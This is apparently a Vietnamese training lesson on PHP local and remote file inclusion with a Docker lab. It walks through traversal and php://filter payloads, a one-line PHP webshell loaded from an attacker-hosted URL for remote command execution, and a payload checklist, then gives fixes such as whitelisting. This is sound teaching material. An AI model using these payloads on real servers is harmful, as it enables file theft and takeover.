# LFI / RFI — File Inclusion

> **Độ khó:** Medium — **Trình độ:** intermediate

## Giới thiệu

App thường nạp nội dung file theo tham số: `index.php?page=home.php`, `?lang=en`, `?view=about`. **File Inclusion** xảy ra khi tham số đó được dùng trực tiếp trong hàm `include()`/`require()` mà không kiểm tra. **LFI (Local File Inclusion)** — đọc file trên chính server (`/etc/passwd`, source code...). **RFI (Remote File Inclusion)** — nạp file từ xa (webshell). Nằm trong nhóm **A05 Security Misconfiguration / A03 Injection** tùy cách phân loại. Dùng trong **chaining**: LFI đọc source → tìm hàm mật → RCE.

---

## Phần A — Hiểu (Understand)

### Cơ chế

App làm:

```php
// LỖI CỐ Ý
$page = $_GET['page'];
include($page);
```

- Bạn gửi `?page=../../../../etc/passwd` → include nội dung `/etc/passwd`.
- Nếu dùng `php://filter` có thể đọc **source code** dạng base64: `?page=php://filter/convert.base64-encode/resource=home.php`.
- Nếu PHP config bật `allow_url_include=On`, bạn gửi `?page=http://evil.com/shell.txt` → server tải webshell về và chạy → **RFI → RCE**.

### LFI vs RFI

| | LFI | RFI |
|---|---|---|
| Nạp | File nội bộ server | File từ URL xa |
| Hậu quả | Đọc file nhạy cảm | Chạy mã từ xa (RCE) |
| Điều kiện | Chỉ cần `include()` không kiểm tra | Cần `allow_url_include=On` |
| Ví dụ | `/etc/passwd`, `php://filter` | `http://attacker/shell.txt` |

> **Dễ hiểu:** App nói "mở hộp tôi đưa tên". LFI: bạn bảo nó mở hộp ngoài tầm cho phép (đường dẫn `../../`). RFI: bạn đưa một cái hộp từ nhà bạn về — bên trong là mã độc.

---

## Phần B — Khai thác: Lab LFI/RFI

### Bước 1: Khởi động lab

```bash
cd lfi-rfi/lab
docker compose up -d

> 💡 **Lấy link lab:** Mở bài học này trên trang **Learning Detail** → bấm **"Truy cập Lab"** để hệ thống cấp link thực tế (VD: `https://vuln.ghedahaui.online/labs-env/...`). Thay `<LAB_ADDRESS>` bằng link đó trong các lệnh dưới đây.

# Lab tại: <LAB_ADDRESS>
```

Lab là trang đọc tin có tham số `page` (nạp nội dung file trong thư mục `pages/`). Có 2 flag: file `/flag.txt` (đọc qua LFI) và flag của webshell (qua RFI).

<!-- Output already described via CLI commands above -->

### Bước 2: Duyệt trang bình thường

```bash
$ curl -s "<LAB_ADDRESS>/index.php?page=home"
( nội dung trang home )
```

<!-- Output already described via CLI commands above -->

### Bước 3: LFI đọc /etc/passwd

```bash
$ curl -s "<LAB_ADDRESS>/index.php?page=../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
...
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** `../../../../etc/passwd` đi lên 4 thư mục để tới `/etc/passwd`. Vì `include()` không kiểm tra đường dẫn, bạn có thể điều hướng nó sang bất kỳ file nào server đọc được. (Trên PHP rất cũ còn có kỹ thuật **null byte** `%00` để cắt bỏ đuôi `.php` nếu code nối thêm đuôi file.)

### Bước 4: LFI đọc source code bằng php://filter

```bash
$ curl -s "<LAB_ADDRESS>/index.php?page=php://filter/convert.base64-encode/resource=home.php"
PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4K...
```

<!-- Output already described via CLI commands above -->

```bash
# Giải mã base64 ra source
$ curl -s "<LAB_ADDRESS>/index.php?page=php://filter/convert.base64-encode/resource=home.php" | base64 -d
```

> **Giải thích:** `php://filter` khiến PHP đọc **source code** rồi encode base64 (vì nếu đọc thẳng, PHP sẽ chạy file rồi mới in output — base64 giúp bạn thấy mã gốc). Từ source bạn tìm tham số, hàm `include`, cấu trúc thư mục... rồi đọc các file khác (`config.php`, `admin.php`).

### Bước 5: Đọc flag qua LFI

```bash
$ curl -s "<LAB_ADDRESS>/index.php?page=../../../../flag.txt"
FLAG{l0c4l_f1l3_1ncl_2026}
```

<!-- Output already described via CLI commands above -->

### Bước 6: RFI — nạp webshell từ xa → RCE

```bash
# 1. Trên máy attacker, tạo file shell.txt chứa mã PHP:
#    <?php system($_GET['cmd']); ?>
#    và chạy HTTP server:  python3 -m http.server 8888

# 2. Nạp file từ xa vào lab
$ curl -s "<LAB_ADDRESS>/index.php?page=http://YOUR_IP:8888/shell.txt"

# 3. Chạy lệnh từ xa
$ curl -s "<LAB_ADDRESS>/index.php?page=http://YOUR_IP:8888/shell.txt&cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** PHP gặp `include("http://attacker/shell.txt")` → tải nội dung file từ xa. Nội dung là mã PHP → được thực thi trên server. Tham số `cmd` điều khiển lệnh. Đây là **RCE** — bạn điều khiển server. (Phần RFI này cần lab chạy với `allow_url_include=On`.)

---

## Phần C — Phòng thủ & Checklist (Defend)

### Cách fix

1. **Whitelist** — chỉ cho phép danh sách file hợp lệ:

```php
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (!in_array($page, $allowed, true)) { die('invalid'); }
include("pages/$page.php");
```
2. **Không dùng input làm đường dẫn.** Nếu cần, ánh xạ qua mảng (`key => file thật`).
3. **Vô hiệu `allow_url_include`** (mặc định Off) — chặn RFI.
4. Đặt flag ngoài web root, chmod đúng, disable `include` động nếu không cần.

### Checklist test nhanh

```text
[ ] ?page=../../../../etc/passwd
[ ] ?page=/etc/passwd  (absolute path)
[ ] ?page=..%2f..%2f..%2fetc%2fpasswd  (encode)
[ ] ?page=php://filter/convert.base64-encode/resource=home.php
[ ] ?page=http://YOUR_IP/shell.txt  (RFI — thử nếu có allow_url_include)
[ ] ?page=data://text/plain;base64,PD9waHAg...  (data:// wrapper)
[ ] Có file .php nào thực hiện include tham số không? (đọc source bằng filter)
```

---
